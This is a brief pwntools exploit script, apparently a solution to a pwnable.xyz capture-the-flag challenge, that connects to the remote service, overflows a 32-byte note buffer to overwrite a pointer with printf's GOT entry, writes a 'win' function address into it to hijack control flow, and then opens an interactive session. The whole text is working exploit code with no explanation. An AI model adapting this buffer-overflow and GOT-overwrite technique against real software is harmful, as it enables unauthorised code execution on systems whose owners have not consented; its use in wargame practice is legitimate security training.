from pwn import *

p = remote("svc.pwnable.xyz", 30016)

len = 32 + 10
printf_got = 0x601238
win_address = 0x40093C

p.recvuntil("> ")
p.sendline("1")
p.recvuntil("Note len? ")
p.sendline(str(len))

payload = b"A" * 32
payload += p64(printf_got)

p.recvuntil("note: ")
p.sendline(payload)

p.recvuntil("> ")
p.sendline('2')
p.recvuntil("desc: ")
p.sendline(p64(win_address))

p.interactive()